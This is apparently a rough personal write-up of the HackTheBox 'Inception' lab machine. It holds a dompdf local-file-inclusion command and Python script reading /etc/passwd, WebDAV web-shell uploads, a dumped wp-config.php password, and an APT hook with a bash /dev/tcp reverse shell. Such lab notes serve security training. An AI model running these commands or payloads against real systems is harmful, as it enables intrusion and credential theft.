@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="dark">
+<title>Inception · the-grizzly-bear</title>
+<meta name="description" content="Inception — Cybersecurity Notes &amp; CTF Writeups">
+<link rel="stylesheet" href="../../assets/style.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#127988;</text></svg>">
+</head>
+<body>
+<button id="menu-toggle" aria-label="Toggle navigation">&#9776;</button>
+<div class="layout">
+<aside class="sidebar" id="sidebar">
+  <a class="brand" href="../../index.html">
+    <span class="brand-flag">&#127988;</span>
+    <span class="brand-text"><strong>the-grizzly-bear</strong><small>Cybersecurity Notes &amp; CTF Writeups</small></span>
+  </a>
+  <nav class="nav" id="nav-root" data-current="htb/completed-machines/inception.html" data-root="../.."></nav>
+</aside>
+<main class="content">
+  <article class="doc">
+  <div class="breadcrumb"><a href="../../index.html">the-grizzly-bear</a> &rsaquo; <a href="../index.html">HackTheBox</a> &rsaquo; <a href="index.html">Completed Machines</a></div>
+<h1 id="title">Inception</h1>
+
+<p class="figure"><a class="img-link" href="inception/untitled.png"><img src="inception/untitled.png" alt="Untitled" loading="lazy"></a></p>
+<p>messsed around with proxy chains but didnt get much yet</p>
+<p class="figure"><a class="img-link" href="inception/untitled-1.png"><img src="inception/untitled-1.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="inception/untitled-2.png"><img src="inception/untitled-2.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="inception/untitled-3.png"><img src="inception/untitled-3.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="inception/untitled-4.png"><img src="inception/untitled-4.png" alt="Untitled" loading="lazy"></a></p>
+<p>/.hta                 (Status: 403) [Size: 291]<br>
+/.htpasswd            (Status: 403) [Size: 296]<br>
+/.htaccess            (Status: 403) [Size: 296]<br>
+/assets               (Status: 301) [Size: 313] <a href="http://10.129.1.104/assets/" target="_blank" rel="noopener">--&gt; [<a href="http://10.129.1.104/assets/" target="_blank" rel="noopener">http://10.129.1.104/assets/</a></a>]<br>
+/images               (Status: 301) [Size: 313] <a href="http://10.129.1.104/images/" target="_blank" rel="noopener">--&gt; [<a href="http://10.129.1.104/images/" target="_blank" rel="noopener">http://10.129.1.104/images/</a></a>]<br>
+/index.html           (Status: 200) [Size: 2877]<br>
+/server-status        (Status: 403) [Size: 300]</p>
+<p class="figure"><a class="img-link" href="inception/untitled-5.png"><img src="inception/untitled-5.png" alt="Untitled" loading="lazy"></a></p>
+<p>/.htaccess            (Status: 403) [Size: 296]<br>
+/.htpasswd            (Status: 403) [Size: 296]<br>
+/assets               (Status: 301) [Size: 313] <a href="http://10.129.1.104/assets/" target="_blank" rel="noopener">--&gt; [<a href="http://10.129.1.104/assets/" target="_blank" rel="noopener">http://10.129.1.104/assets/</a></a>]<br>
+/dompdf               (Status: 301) [Size: 313] <a href="http://10.129.1.104/dompdf/" target="_blank" rel="noopener">--&gt; [<a href="http://10.129.1.104/dompdf/" target="_blank" rel="noopener">http://10.129.1.104/dompdf/</a></a>]<br>
+/images               (Status: 301) [Size: 313] <a href="http://10.129.1.104/images/" target="_blank" rel="noopener">--&gt; [<a href="http://10.129.1.104/images/" target="_blank" rel="noopener">http://10.129.1.104/images/</a></a>]<br>
+/server-status        (Status: 403) [Size: 300]</p>
+<p class="figure"><a class="img-link" href="inception/untitled-6.png"><img src="inception/untitled-6.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="inception/untitled-7.png"><img src="inception/untitled-7.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="inception/untitled-8.png"><img src="inception/untitled-8.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="inception/untitled-9.png"><img src="inception/untitled-9.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="inception/untitled-10.png"><img src="inception/untitled-10.png" alt="Untitled" loading="lazy"></a></p>
+<p>decode the chunk</p>
+<p class="figure"><a class="img-link" href="inception/untitled-11.png"><img src="inception/untitled-11.png" alt="Untitled" loading="lazy"></a></p>
+<p><code>curl http://10.129/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd</code></p>
+<h2 id="iterate-local-file-inclusion">iterate Local file inclusion</h2>
+<pre><code>#!/usr/bin/env python3import base64
+import urllib.request
+import argparse
+
+parser= argparse.ArgumentParser()
+parser.add_argument("file")
+args= parser.parse_args()
+
+url= 'http://10.129.1.104/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource='
+
+try:
+	req= urllib.request.urlopen(url+ args.file)
+
+	output= req.read()
+
+if output:
+		string= output.decode()
+		result= string[string.find("[(")+2:string.find(")]")]
+		decoded= base64.b64decode(result).decode('utf8')
+print(decoded)
+
+except urllib.error.HTTPError:
+print("File cannot be downloaded")
+</code></pre>
+<p class="figure"><a class="img-link" href="inception/untitled-12.png"><img src="inception/untitled-12.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="inception/untitled-13.png"><img src="inception/untitled-13.png" alt="Untitled" loading="lazy"></a></p>
+<p>./lfi.py /var/www/html/webdav_test_inception/webdav.passwd<br>
+webdav_tester:$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0</p>
+<p class="figure"><a class="img-link" href="inception/untitled-14.png"><img src="inception/untitled-14.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="inception/untitled-15.png"><img src="inception/untitled-15.png" alt="Untitled" loading="lazy"></a></p>
+<p>userpassword</p>
+<p>babygurl69</p>
+<p>davtest -url <a href="http://10.129.1.104/webdav_test_inception" target="_blank" rel="noopener">http://10.129.1.104/webdav_test_inception</a> -auth webdav_tester:babygurl69</p>
+<p class="figure"><a class="img-link" href="inception/untitled-16.png"><img src="inception/untitled-16.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="inception/untitled-17.png"><img src="inception/untitled-17.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="inception/untitled-18.png"><img src="inception/untitled-18.png" alt="Untitled" loading="lazy"></a></p>
+<p><a href="http://10.129.1.104/webdav_test_inception/DavTestDir_WuwN4ArCMjiZLP/davtest_WuwN4ArCMjiZLP.php" target="_blank" rel="noopener">http://10.129.1.104/webdav_test_inception/DavTestDir_WuwN4ArCMjiZLP/davtest_WuwN4ArCMjiZLP.php</a></p>
+<p class="figure"><a class="img-link" href="inception/untitled-19.png"><img src="inception/untitled-19.png" alt="Untitled" loading="lazy"></a></p>
+<p>failing here with php shells</p>
+<p class="figure"><a class="img-link" href="inception/untitled-20.png"><img src="inception/untitled-20.png" alt="Untitled" loading="lazy"></a></p>
+<p>curl -X PUT <a href="http://webdav_tester:babygurl69@10.129.1.104/webdav_test_inception/0xdf.php" target="_blank" rel="noopener">http://webdav_tester:babygurl69@10.129.1.104/webdav_test_inception/</a>shell.php -d @shell.php<br>
+&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;<br>
+&lt;html&gt;&lt;head&gt;<br>
+&lt;title&gt;201 Created&lt;/title&gt;<br>
+&lt;/head&gt;&lt;body&gt;<br>
+&lt;h1&gt;Created&lt;/h1&gt;<br>
+&lt;p&gt;Resource /webdav_test_inception/0xdf.php has been created.&lt;/p&gt;<br>
+&lt;hr /&gt;<br>
+&lt;address&gt;Apache/2.4.18 (Ubuntu) Server at 10.129.1.104 Port 80&lt;/address&gt;<br>
+&lt;/body&gt;&lt;/html&gt;</p>
+<p>─[us-dedicated-100-dhcp]─[10.10.14.2]─[htb-ep-8352@pwnbox-base]─[~]<br>
+└──╼ [★]$ curl -X PUT <a href="http://webdav_tester:babygurl69@10.129.1.104/webdav_test_inception/shell.php" target="_blank" rel="noopener">http://webdav_tester:babygurl69@10.129.1.104/webdav_test_inception/shell.php</a> -d @shell.php</p>
+<p>curl -X PUT <a href="http://webdav_tester:babygurl69@10.129.1.104/webdav_test_inception/shell2.php?cmd=id" target="_blank" rel="noopener">http://webdav_tester:babygurl69@10.129.1.104/webdav_test_inception/shell.pycmd=id</a></p>
+<p><a href="https://github.com/Arrexel/phpbash.git" target="_blank" rel="noopener">https://github.com/Arrexel/phpbash.git</a></p>
+<p class="figure"><a class="img-link" href="inception/untitled-21.png"><img src="inception/untitled-21.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="inception/untitled-22.png"><img src="inception/untitled-22.png" alt="Untitled" loading="lazy"></a></p>
+<p><a href="http://10.129.1.104/webdav_test_inception/phpbash.php" target="_blank" rel="noopener">http://10.129.1.104/webdav_test_inception/phpbash.php</a></p>
+<p class="figure"><a class="img-link" href="inception/untitled-23.png"><img src="inception/untitled-23.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="inception/untitled-24.png"><img src="inception/untitled-24.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="inception/untitled-25.png"><img src="inception/untitled-25.png" alt="Untitled" loading="lazy"></a></p>
+<p>&lt;?php<br>
+/**</p>
+<ul><li>The base configuration for WordPress</li><li></li><li>The wp-config.php creation script uses this file during the</li><li>installation. You don't have to use the web site, you can</li><li>copy this file to "wp-config.php" and fill in the values.</li><li></li><li>This file contains the following configurations:</li><li></li><li>MySQL settings</li><li>Secret keys</li><li>Database table prefix</li><li>ABSPATH</li><li></li><li>@link <a href="https://codex.wordpress.org/Editing_wp-config.php" target="_blank" rel="noopener">https://codex.wordpress.org/Editing_wp-config.php</a></li><li></li><li>@package WordPress<br>*/</li></ul>
+<p>// ** MySQL settings - You can get this info from your web host ** //<br>
+/** The name of the database for WordPress */<br>
+define('DB_NAME', 'wordpress');</p>
+<p>/** MySQL database username */<br>
+define('DB_USER', 'root');</p>
+<p>/** MySQL database password */<br>
+define('DB_PASSWORD', 'VwPddNh7xMZyDQoByQL4');</p>
+<p>/** MySQL hostname */<br>
+define('DB_HOST', 'localhost');</p>
+<p>/** Database Charset to use in creating database tables. */<br>
+define('DB_CHARSET', 'utf8');</p>
+<p>/** The Database Collate type. Don't change this if in doubt. */<br>
+define('DB_COLLATE', '');</p>
+<p>/**#@+</p>
+<ul><li>Authentication Unique Keys and Salts.</li><li></li><li>Change these to different unique phrases!</li><li>You can generate these using the {@link <a href="https://api.wordpress.org/secret-key/1.1/salt/" target="_blank" rel="noopener">https://api.wordpress.org/secret-key/1.1/salt/</a> <a href="http://wordpress.org/" target="_blank" rel="noopener">WordPress.org</a> secret-key service}</li><li>You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.</li><li></li><li>@since 2.6.0<br>*/<br>define('AUTH_KEY', 'put your unique phrase here');<br>define('SECURE_AUTH_KEY', 'put your unique phrase here');<br>define('LOGGED_IN_KEY', 'put your unique phrase here');<br>define('NONCE_KEY', 'put your unique phrase here');<br>define('AUTH_SALT', 'put your unique phrase here');<br>define('SECURE_AUTH_SALT', 'put your unique phrase here');<br>define('LOGGED_IN_SALT', 'put your unique phrase here');<br>define('NONCE_SALT', 'put your unique phrase here');</li></ul>
+<p>/<em>#@-</em>/</p>
+<p>/**</p>
+<ul><li>WordPress Database Table prefix.</li><li></li><li>You can have multiple installations in one database if you give each</li><li>a unique prefix. Only numbers, letters, and underscores please!<br>*/<br>$table_prefix = 'wp_';</li></ul>
+<p>/**</p>
+<ul><li>For developers: WordPress debugging mode.</li><li></li><li>Change this to true to enable the display of notices during development.</li><li>It is strongly recommended that plugin and theme developers use WP_DEBUG</li><li>in their development environments.</li><li></li><li>For information on other constants that can be used for debugging,</li><li>visit the Codex.</li><li></li><li>@link <a href="https://codex.wordpress.org/Debugging_in_WordPress" target="_blank" rel="noopener">https://codex.wordpress.org/Debugging_in_WordPress</a><br>*/<br>define('WP_DEBUG', false);</li></ul>
+<p>/* That's all, stop editing! Happy blogging. */</p>
+<p>/** Absolute path to the WordPress directory. */<br>
+if ( !defined('ABSPATH') )<br>
+define('ABSPATH', dirname(<strong>FILE</strong>) . '/');</p>
+<p>/** Sets up WordPress vars and included files. */<br>
+require_once(ABSPATH . 'wp-settings.php');</p>
+<p>root and VwPddNh7xMZyDQoByQL4</p>
+<p>curl --data-urlencode 'cmd=nc 10.10.14.2 9999 2&gt;&amp;1' <a href="http://webdav_tester:babygurl69@10.129.1.104/webdav_test_inception/shl.php" target="_blank" rel="noopener">http://webdav_tester:babygurl69@10.129.1.104/webdav_test_inception/shl.php</a></p>
+<p class="figure"><a class="img-link" href="inception/untitled-26.png"><img src="inception/untitled-26.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="inception/untitled-27.png"><img src="inception/untitled-27.png" alt="Untitled" loading="lazy"></a></p>
+<p>└──╼ [★]$ curl <a href="http://webdav_tester:babygurl69@10.129.1.104/webdav_test_inception/s.php?cmd=whoami" target="_blank" rel="noopener">http://webdav_tester:babygurl69@10.129.1.104/webdav_test_inception/s.php?cmd=whoami</a><br>
+www-data<br>
+─[us-dedicated-100-dhcp]─[10.10.14.2]─[htb-ep-8352@pwnbox-base]─[~]<br>
+└──╼ [★]$<br>
+─[us-dedicated-100-dhcp]─[10.10.14.2]─[htb-ep-8352@pwnbox-base]─[~]<br>
+└──╼ [★]$ curl --data-urlencode 'cmd=id' <a href="http://webdav_tester:babygurl69@10.129.1.104/webdav_test_inception/s.php" target="_blank" rel="noopener">http://webdav_tester:babygurl69@10.129.1.104/webdav_test_inception/s.php</a>?<br>
+uid=33(www-data) gid=33(www-data) groups=33(www-data)<br>
+─[us-dedicated-100-dhcp]─[10.10.14.2]─[htb-ep-8352@pwnbox-base]─[~]<br>
+└──╼ [★]$ curl --data-urlencode 'cat /home/cobb/user.txt' <a href="http://webdav_tester:babygurl69@10.129.1.104/webdav_test_inception/s.php" target="_blank" rel="noopener">http://webdav_tester:babygurl69@10.129.1.104/webdav_test_inception/s.php</a>?</p>
+<p><a href="https://0xdf.gitlab.io/2022/04/04/htb-inception.html" target="_blank" rel="noopener">https://0xdf.gitlab.io/2022/04/04/htb-inception.html</a></p>
+<p><a href="https://0xdf.gitlab.io/files/inception-forwardshell.py" target="_blank" rel="noopener">https://0xdf.gitlab.io/files/inception-forwardshell.py</a></p>
+<p>didnt quite get this one working</p>
+<p><a href="https://github.com/IppSec/forward-shell" target="_blank" rel="noopener">https://github.com/IppSec/forward-shell</a></p>
+<p>Login with cobb from shell with password from wp-config.php</p>
+<p class="figure"><a class="img-link" href="inception/untitled-28.png"><img src="inception/untitled-28.png" alt="Untitled" loading="lazy"></a></p>
+<p>Sudoers shows full rights,  sudo up</p>
+<p class="figure"><a class="img-link" href="inception/untitled-29.png"><img src="inception/untitled-29.png" alt="Untitled" loading="lazy"></a></p>
+<p>Cat root.txt……………..</p>
+<p>proxychains should be working</p>
+<p class="figure"><a class="img-link" href="inception/untitled-30.png"><img src="inception/untitled-30.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="inception/untitled-31.png"><img src="inception/untitled-31.png" alt="Untitled" loading="lazy"></a></p>
+<p>But its not</p>
+<p>pivot to privsec</p>
+<p class="figure"><a class="img-link" href="inception/untitled-32.png"><img src="inception/untitled-32.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="inception/untitled-33.png"><img src="inception/untitled-33.png" alt="Untitled" loading="lazy"></a></p>
+<p>connecting to 192.168.0.1</p>
+<p><code>nc -zv 192.168.0.1 1-65535 2&gt;&amp;1 | grep -v "refused"</code></p>
+<p>nc -zv 192.168.0.1 1-100 2&gt;&amp;1 | grep -v refused | tee scan</p>
+<p class="figure"><a class="img-link" href="inception/untitled-34.png"><img src="inception/untitled-34.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="inception/untitled-35.png"><img src="inception/untitled-35.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="inception/untitled-36.png"><img src="inception/untitled-36.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="inception/untitled-37.png"><img src="inception/untitled-37.png" alt="Untitled" loading="lazy"></a></p>
+<p>annoying but can get some file, get crontab</p>
+<p class="figure"><a class="img-link" href="inception/untitled-38.png"><img src="inception/untitled-38.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="inception/untitled-39.png"><img src="inception/untitled-39.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="inception/untitled-40.png"><img src="inception/untitled-40.png" alt="Untitled" loading="lazy"></a></p>
+<p>VwPddNh7xMZyDQoByQL4</p>
+<p>APT::Update::Pre-Invoke {"bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.0.10/8888 0&gt;&amp;1'"}</p>
+<p>culr this to www-data on 192.168.0.10, the hot http server, then wget to cobb@127.0.0.1</p>
+<p class="figure"><a class="img-link" href="inception/untitled-41.png"><img src="inception/untitled-41.png" alt="Untitled" loading="lazy"></a></p>
+<p>then tftp put it to the etc/apt/apt.conf.d/ folder</p>
+<p class="figure"><a class="img-link" href="inception/untitled-42.png"><img src="inception/untitled-42.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="inception/untitled-43.png"><img src="inception/untitled-43.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="inception/untitled-44.png"><img src="inception/untitled-44.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="inception/untitled-45.png"><img src="inception/untitled-45.png" alt="Untitled" loading="lazy"></a></p>
+  </article>
+  <footer class="foot">Built from a Notion export · <a href="https://github.com/the-grizzly-bear">github.com/the-grizzly-bear</a></footer>
+</main>
+</div>
+<script src="../../assets/nav.js" defer></script>
+<script>
+document.getElementById('menu-toggle').addEventListener('click',function(){
+  document.getElementById('sidebar').classList.toggle('open');
+});
+</script>
+</body>
+</html>
